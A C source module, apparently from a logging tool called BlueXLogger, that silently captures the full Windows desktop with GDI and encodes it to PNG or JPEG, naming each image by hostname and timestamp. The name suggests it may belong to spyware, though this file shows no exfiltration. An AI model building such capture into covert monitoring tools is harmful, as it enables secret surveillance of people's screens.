/*============================================================================
 * BlueXLogger - bxl_screenshot.c
 * Desktop capture via GDI, encoded to PNG/JPEG via WIC.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_screenshot.h"

#include <objidl.h>
#include <wincodec.h>

#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "gdi32.lib")

static IWICImagingFactory *g_wic = NULL;
static LONG g_com_refs = 0;
static int  g_com_ok = 0;

/*==========================================================================
 * Lifetime
 *========================================================================*/
int bxl_screenshot_init(void)
{
    HRESULT hr;

    if (g_wic) return BXL_TRUE;

    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (SUCCEEDED(hr)) {
        g_com_ok = 1;
        InterlockedIncrement(&g_com_refs);
    } else if (hr == RPC_E_CHANGED_MODE) {
        /* Already initialised in another apartment - usable as-is. */
        g_com_ok = 0;
    } else {
        bxl_logf("screenshot: CoInitializeEx failed 0x%08lX", (unsigned long)hr);
        return BXL_FALSE;
    }

    hr = CoCreateInstance(&CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IWICImagingFactory, (void **)&g_wic);
    if (FAILED(hr)) {
        bxl_logf("screenshot: WIC factory creation failed 0x%08lX",
                 (unsigned long)hr);
        g_wic = NULL;
        if (g_com_ok && InterlockedDecrement(&g_com_refs) == 0)
            CoUninitialize();
        return BXL_FALSE;
    }

    return BXL_TRUE;
}

void bxl_screenshot_shutdown(void)
{
    if (g_wic) {
        IWICImagingFactory_Release(g_wic);
        g_wic = NULL;
    }
    if (g_com_ok && InterlockedDecrement(&g_com_refs) <= 0) {
        CoUninitialize();
        g_com_ok = 0;
    }
}

int bxl_screenshot_ready(void)
{
    return g_wic ? BXL_TRUE : BXL_FALSE;
}

void bxl_screenshot_options_from(const BxlConfig *cfg, BxlShotOptions *out)
{
    if (!out) return;
    memset(out, 0, sizeof(*out));

    if (!cfg) {
        out->monitors = BXL_MON_ALL;
        out->format = BXL_FMT_PNG;
        out->jpeg_quality = 80;
        out->max_dim = 1920;
        return;
    }

    out->monitors     = cfg->shot_monitors;
    out->format       = cfg->shot_format;
    out->jpeg_quality = cfg->shot_jpeg_quality ? cfg->shot_jpeg_quality : 80;
    out->max_dim      = cfg->shot_max_dim;
}

void bxl_shot_free(BxlShot *s)
{
    if (!s) return;
    free(s->data);
    memset(s, 0, sizeof(*s));
}

/*==========================================================================
 * Capture area
 *========================================================================*/
int bxl_screenshot_area(int monitors, int *x, int *y, int *w, int *h)
{
    int vx, vy, vw, vh;

    vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
    vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
    vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (monitors == BXL_MON_PRIMARY || vw <= 0 || vh <= 0) {
        vx = 0; vy = 0;
        vw = GetSystemMetrics(SM_CXSCREEN);
        vh = GetSystemMetrics(SM_CYSCREEN);
    }

    if (vw <= 0 || vh <= 0) return BXL_FALSE;

    if (x) *x = vx;
    if (y) *y = vy;
    if (w) *w = vw;
    if (h) *h = vh;
    return BXL_TRUE;
}

/*==========================================================================
 * DIB capture
 *========================================================================*/
static HBITMAP capture_to_dib(int x, int y, int w, int h, void **bits_out)
{
    HDC     hScreen = NULL;
    HDC     hMem    = NULL;
    HBITMAP hBmp    = NULL;
    BITMAPINFO bi;
    void   *bits = NULL;

    *bits_out = NULL;

    hScreen = GetDC(NULL);
    if (!hScreen) return NULL;

    hMem = CreateCompatibleDC(hScreen);
    if (!hMem) { ReleaseDC(NULL, hScreen); return NULL; }

    memset(&bi, 0, sizeof(bi));
    bi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth       = w;
    bi.bmiHeader.biHeight      = -h;      /* negative => top-down rows */
    bi.bmiHeader.biPlanes      = 1;
    bi.bmiHeader.biBitCount    = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    hBmp = CreateDIBSection(hScreen, &bi, DIB_RGB_COLORS, &bits, NULL, 0);
    if (!hBmp || !bits) {
        if (hBmp) DeleteObject(hBmp);
        DeleteDC(hMem);
        ReleaseDC(NULL, hScreen);
        return NULL;
    }

    HGDIOBJ old = SelectObject(hMem, hBmp);

    /* CAPTUREBLT also grabs layered windows (tooltips, some overlays). */
    if (!BitBlt(hMem, 0, 0, w, h, hScreen, x, y, SRCCOPY | CAPTUREBLT)) {
        SelectObject(hMem, old);
        DeleteObject(hBmp);
        DeleteDC(hMem);
        ReleaseDC(NULL, hScreen);
        return NULL;
    }

    SelectObject(hMem, old);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);

    /* BitBlt leaves the alpha channel undefined (usually zero). Force opaque
     * so the encoded PNG is not fully transparent. */
    {
        bxl_u8 *p = (bxl_u8 *)bits;
        size_t count = (size_t)w * (size_t)h;
        size_t i;
        for (i = 0; i < count; i++)
            p[i * 4 + 3] = 0xFF;
    }

    *bits_out = bits;
    return hBmp;
}

/*==========================================================================
 * WIC encoding
 *========================================================================*/
static int encode_bitmap(IWICBitmap *pBitmap, const BxlShotOptions *opt,
                         BxlBuf *out)
{
    IWICBitmapEncoder *pEncoder = NULL;
    IWICBitmapFrameEncode *pFrame = NULL;
    IPropertyBag2 *pProps = NULL;
    IWICStream *pStream = NULL;
    IStream *pMemStream = NULL;
    IWICBitmapScaler *pScaler = NULL;
    IWICFormatConverter *pConverter = NULL;
    IWICBitmapSource *pSource = NULL;
    IWICBitmapSource *pScaled = NULL;
    HGLOBAL hGlobal = NULL;
    HRESULT hr;
    int ok = BXL_FALSE;
    UINT w = 0, h = 0;
    const GUID *container;
    WICPixelFormatGUID pixelFormat;

    IWICBitmap_GetSize(pBitmap, &w, &h);

    pSource = (IWICBitmapSource *)pBitmap;
    IWICBitmapSource_AddRef(pSource);

    /* ---- optional downscale -------------------------------------------- */
    if (opt->max_dim > 0 && (w > opt->max_dim || h > opt->max_dim)) {
        double scale = (double)opt->max_dim / (double)BXL_MAX(w, h);
        UINT nw = (UINT)((double)w * scale + 0.5);
        UINT nh = (UINT)((double)h * scale + 0.5);
        if (nw < 1) nw = 1;
        if (nh < 1) nh = 1;

        hr = IWICImagingFactory_CreateBitmapScaler(g_wic, &pScaler);
        if (SUCCEEDED(hr)) {
            hr = IWICBitmapScaler_Initialize(pScaler, pSource, nw, nh,
                                             WICBitmapInterpolationModeFant);
            if (SUCCEEDED(hr)) {
                pScaled = (IWICBitmapSource *)pScaler;
                IWICBitmapSource_AddRef(pScaled);
            }
        }
    }
    if (!pScaled) {
        pScaled = pSource;
        IWICBitmapSource_AddRef(pScaled);
    }

    /* ---- format --------------------------------------------------------- */
    if (opt->format == BXL_FMT_JPEG) {
        container   = &GUID_ContainerFormatJpeg;
        pixelFormat = GUID_WICPixelFormat24bppBGR;
    } else {
        container   = &GUID_ContainerFormatPng;
        pixelFormat = GUID_WICPixelFormat32bppBGRA;
    }

    hr = IWICImagingFactory_CreateFormatConverter(g_wic, &pConverter);
    if (FAILED(hr)) goto cleanup;
    hr = IWICFormatConverter_Initialize(pConverter, pScaled, &pixelFormat,
                                        WICBitmapDitherTypeNone, NULL, 0.0,
                                        WICBitmapPaletteTypeCustom);
    if (FAILED(hr)) goto cleanup;

    /* ---- stream --------------------------------------------------------- */
    hr = CreateStreamOnHGlobal(NULL, TRUE, &pMemStream);
    if (FAILED(hr)) goto cleanup;

    hr = IWICImagingFactory_CreateStream(g_wic, &pStream);
    if (FAILED(hr)) goto cleanup;
    hr = IWICStream_InitializeFromIStream(pStream, pMemStream);
    if (FAILED(hr)) goto cleanup;

    hr = IWICImagingFactory_CreateEncoder(g_wic, container, NULL, &pEncoder);
    if (FAILED(hr)) goto cleanup;
    hr = IWICBitmapEncoder_Initialize(pEncoder, (IStream *)pStream,
                                      WICBitmapEncoderNoCache);
    if (FAILED(hr)) goto cleanup;

    hr = IWICBitmapEncoder_CreateNewFrame(pEncoder, &pFrame, &pProps);
    if (FAILED(hr)) goto cleanup;

    if (opt->format == BXL_FMT_JPEG && pProps) {
        PROPBAG2 pb;
        VARIANT  var;
        memset(&pb, 0, sizeof(pb));
        pb.pstrName = (LPOLESTR)L"ImageQuality";
        VariantInit(&var);
        var.vt = VT_R4;
        var.fltVal = (float)opt->jpeg_quality / 100.0f;
        IPropertyBag2_Write(pProps, 1, &pb, &var);
        VariantClear(&var);
    }

    hr = IWICBitmapFrameEncode_Initialize(pFrame, pProps);
    if (FAILED(hr)) goto cleanup;

    IWICBitmapSource_GetSize(pConverter, &w, &h);
    hr = IWICBitmapFrameEncode_SetSize(pFrame, w, h);
    if (FAILED(hr)) goto cleanup;

    hr = IWICBitmapFrameEncode_SetPixelFormat(pFrame, &pixelFormat);
    if (FAILED(hr)) goto cleanup;

    hr = IWICBitmapFrameEncode_WriteSource(pFrame, (IWICBitmapSource *)pConverter,
                                           NULL);
    if (FAILED(hr)) goto cleanup;

    hr = IWICBitmapFrameEncode_Commit(pFrame);
    if (FAILED(hr)) goto cleanup;

    hr = IWICBitmapEncoder_Commit(pEncoder);
    if (FAILED(hr)) goto cleanup;

    /* ---- pull the bytes out of the HGLOBAL ------------------------------ */
    {
        STATSTG stat;
        LARGE_INTEGER zero;
        HRESULT sh;

        zero.QuadPart = 0;
        sh = IStream_Seek(pMemStream, zero, STREAM_SEEK_SET, NULL);
        if (FAILED(sh)) goto cleanup;

        memset(&stat, 0, sizeof(stat));
        sh = IStream_Stat(pMemStream, &stat, STATFLAG_NONAME);
        if (FAILED(sh) || stat.cbSize.QuadPart <= 0) goto cleanup;

        if (!bxl_buf_reserve(out, (size_t)stat.cbSize.QuadPart)) goto cleanup;

        {
            ULONG got = 0;
            sh = IStream_Read(pMemStream, out->data + out->len,
                              (ULONG)stat.cbSize.QuadPart, &got);
            if (FAILED(sh) || got == 0) goto cleanup;
            out->len += got;
            out->data[out->len] = '\0';
        }
    }

    ok = BXL_TRUE;

cleanup:
    if (pProps)     IPropertyBag2_Release(pProps);
    if (pFrame)     IWICBitmapFrameEncode_Release(pFrame);
    if (pEncoder)   IWICBitmapEncoder_Release(pEncoder);
    if (pStream)    IWICStream_Release(pStream);
    if (pMemStream) IStream_Release(pMemStream);
    if (pConverter) IWICFormatConverter_Release(pConverter);
    if (pScaled)    IWICBitmapSource_Release(pScaled);
    if (pSource)    IWICBitmapSource_Release(pSource);
    (void)hGlobal;

    if (!ok) bxl_logf("screenshot: encode failed 0x%08lX", (unsigned long)hr);
    return ok;
}

/*==========================================================================
 * Public capture
 *========================================================================*/
int bxl_screenshot_capture(const BxlShotOptions *opt, const char *hostname,
                           BxlShot *out)
{
    BxlShotOptions def;
    int x, y, w, h;
    void *bits = NULL;
    HBITMAP hBmp = NULL;
    IWICBitmap *pBitmap = NULL;
    BxlBuf encoded;
    HRESULT hr;
    int ok = BXL_FALSE;
    char stamp[32];

    if (!out) return BXL_FALSE;
    memset(out, 0, sizeof(*out));

    if (!opt) {
        memset(&def, 0, sizeof(def));
        def.monitors = BXL_MON_ALL;
        def.format = BXL_FMT_PNG;
        def.jpeg_quality = 80;
        def.max_dim = 1920;
        opt = &def;
    }

    if (!bxl_screenshot_ready() && !bxl_screenshot_init()) return BXL_FALSE;

    if (!bxl_screenshot_area(opt->monitors, &x, &y, &w, &h)) {
        bxl_logf("screenshot: no capture area");
        return BXL_FALSE;
    }

    hBmp = capture_to_dib(x, y, w, h, &bits);
    if (!hBmp) {
        bxl_logf("screenshot: BitBlt failed (%lu)", GetLastError());
        return BXL_FALSE;
    }

    if (!bxl_buf_init(&encoded, 1 << 20)) {
        DeleteObject(hBmp);
        return BXL_FALSE;
    }

    {
        WICPixelFormatGUID srcFormat = GUID_WICPixelFormat32bppBGRA;
        hr = IWICImagingFactory_CreateBitmapFromMemory(
                g_wic, (UINT)w, (UINT)h, &srcFormat,
                (UINT)w * 4, (UINT)((size_t)w * 4 * (size_t)h),
                (BYTE *)bits, &pBitmap);
    }
    if (FAILED(hr)) {
        bxl_logf("screenshot: CreateBitmapFromMemory failed 0x%08lX",
                 (unsigned long)hr);
        goto done;
    }

    if (!encode_bitmap(pBitmap, opt, &encoded)) goto done;

    bxl_format_timestamp_compact(bxl_unix_time(), stamp, sizeof(stamp));
    StringCchPrintfA(out->filename, sizeof(out->filename),
                     "%s_%s_%s.%s", BXL_PRODUCT_NAME,
                     (hostname && hostname[0]) ? hostname : "host",
                     stamp,
                     (opt->format == BXL_FMT_JPEG) ? "jpg" : "png");

    StringCchCopyA(out->mime_type, sizeof(out->mime_type),
                   (opt->format == BXL_FMT_JPEG) ? "image/jpeg" : "image/png");

    out->width  = w;
    out->height = h;
    out->data   = bxl_buf_detach(&encoded, &out->len);
    ok = (out->data && out->len > 0) ? BXL_TRUE : BXL_FALSE;

done:
    bxl_buf_free(&encoded);
    if (pBitmap) IWICBitmap_Release(pBitmap);
    if (hBmp)    DeleteObject(hBmp);

    if (!ok) bxl_shot_free(out);
    return ok;
}

int bxl_screenshot_capture_to_file(const BxlShotOptions *opt,
                                   const char *hostname,
                                   const wchar_t *dir,
                                   wchar_t *path_out, size_t path_cch)
{
    BxlShot shot;
    wchar_t wname[256];
    wchar_t full[MAX_PATH * 2];
    HANDLE h;
    DWORD written = 0;
    int ok = BXL_FALSE;

    if (!dir || !path_out) return BXL_FALSE;
    if (!bxl_dir_create(dir)) return BXL_FALSE;

    if (!bxl_screenshot_capture(opt, hostname, &shot)) return BXL_FALSE;

    if (!bxl_utf8_to_wide(shot.filename, wname, BXL_COUNT_OF(wname))) {
        bxl_shot_free(&shot);
        return BXL_FALSE;
    }
    if (!bxl_path_join(full, BXL_COUNT_OF(full), dir, wname)) {
        bxl_shot_free(&shot);
        return BXL_FALSE;
    }

    h = CreateFileW(full, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        if (WriteFile(h, shot.data, (DWORD)shot.len, &written, NULL) &&
            written == (DWORD)shot.len) {
            StringCchCopyW(path_out, path_cch, full);
            ok = BXL_TRUE;
        }
        CloseHandle(h);
    }

    bxl_shot_free(&shot);
    return ok;
}
